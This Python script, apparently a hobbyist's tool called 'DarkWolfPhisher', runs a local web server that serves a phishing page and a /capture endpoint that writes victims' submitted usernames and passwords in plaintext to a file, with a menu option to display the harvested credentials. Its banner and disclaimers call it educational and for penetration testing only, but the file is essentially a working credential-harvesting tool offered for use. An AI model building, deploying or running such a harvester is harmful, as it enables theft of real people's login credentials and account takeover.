import os
import time
import pyfiglet
from colorama import Fore, Style, init
from rich.console import Console
import http.server
import socketserver
import sys

# Initialize colorama and rich console
init(autoreset=True)
console = Console()

# Configuration
PORT = 8080
PHISHING_PAGE = "index.html"
CAPTURED_DATA_FILE = "captured_data.txt"

# Function to clear the terminal
def clear():
    os.system("cls" if os.name == "nt" else "clear")

# Function for animated printing
def animated_print(text, color=Fore.WHITE, delay=0.05):
    for char in text:
        print(color + char, end="", flush=True)
        time.sleep(delay)
    print()

# Function to display the banner
def show_banner():
    clear()
    
    console.print("=" * 60, style="cyan")
    animated_print("Created by Muhammad Saqlain Shoukat".center(60), Fore.YELLOW)
    console.print("=" * 60, style="cyan")

    ascii_banner = pyfiglet.figlet_format("DarkWolfPhisher")
    console.print(f"[bold red]{ascii_banner}[/bold red]")

    console.print("=" * 60, style="cyan")
    animated_print("About Me:", Fore.GREEN)
    console.print("=" * 60, style="cyan")

    animated_print("I am a cybersecurity enthusiast and developer.".center(60), Fore.LIGHTWHITE_EX)
    animated_print("My goal is to provide ethical hacking education.".center(60), Fore.LIGHTWHITE_EX)
    animated_print("This tool is created for penetration testing only!".center(60), Fore.LIGHTWHITE_EX)

    console.print("=" * 60, style="cyan")
    animated_print("YouTube Channel: Coding Chat Room".center(60), Fore.BLUE)
    animated_print("https://www.youtube.com/@CodingChatRoom".center(60), Fore.LIGHTBLUE_EX)
    animated_print("Learn Ethical Hacking & MERN Stack Development".center(60), Fore.LIGHTWHITE_EX)
    console.print("=" * 60, style="cyan")

    console.print("[bold red]DISCLAIMER: This tool is for educational purposes only.[/bold red]")
    console.print("[bold red]Use it only for ethical penetration testing![/bold red]")
    console.print("=" * 60, style="cyan")

    console.print("[yellow][1] Start Phishing[/yellow]")
    console.print("[yellow][2] View Captured Data[/yellow]")
    console.print("[yellow][3] Exit[/yellow]")
    
    print()
    animated_print("Enter your choice: ", Fore.CYAN, delay=0.03)

# Custom HTTP request handler to serve index.html
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            self.path = f"/{PHISHING_PAGE}"
        return http.server.SimpleHTTPRequestHandler.do_GET(self)

# Function to start phishing server
def start_phishing():
    if not os.path.exists(PHISHING_PAGE):
        print("[!] Phishing page not found!")
        return
    
    print(f"[+] Starting phishing server on port {PORT}...")
    
    handler = MyHandler
    os.chdir(os.path.dirname(os.path.abspath(__file__)))  # Ensure correct directory
    
    with socketserver.TCPServer(("", PORT), handler) as httpd:
        print("[+] Server is running... Press Ctrl+C to stop.")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[!] Server stopped.")

# Function to view captured data
def view_captured_data():
    if not os.path.exists(CAPTURED_DATA_FILE):
        print("[!] No captured data found!")
        return
    
    with open(CAPTURED_DATA_FILE, "r") as file:
        data = file.read()
        print("\n[+] Captured Data:\n" + data)

import json

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            self.path = f"/{PHISHING_PAGE}"
        return http.server.SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        if self.path == "/capture":
            content_length = int(self.headers["Content-Length"])
            post_data = self.rfile.read(content_length)
            credentials = json.loads(post_data)

            with open(CAPTURED_DATA_FILE, "a") as file:
                file.write(f"Username: {credentials['username']}, Password: {credentials['password']}\n")

            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Captured")


# Main menu function
def main():
    while True:
        print("\n[1] Start Phishing")
        print("[2] View Captured Data")
        print("[3] Exit")
        choice = input("Enter your choice: ")

        if choice == "1":
            start_phishing()
        elif choice == "2":
            view_captured_data()
        elif choice == "3":
            print("[!] Exiting...")
            sys.exit()
        else:
            print("[!] Invalid choice, try again.")

# Run the script
if __name__ == "__main__":
    show_banner()
    main()
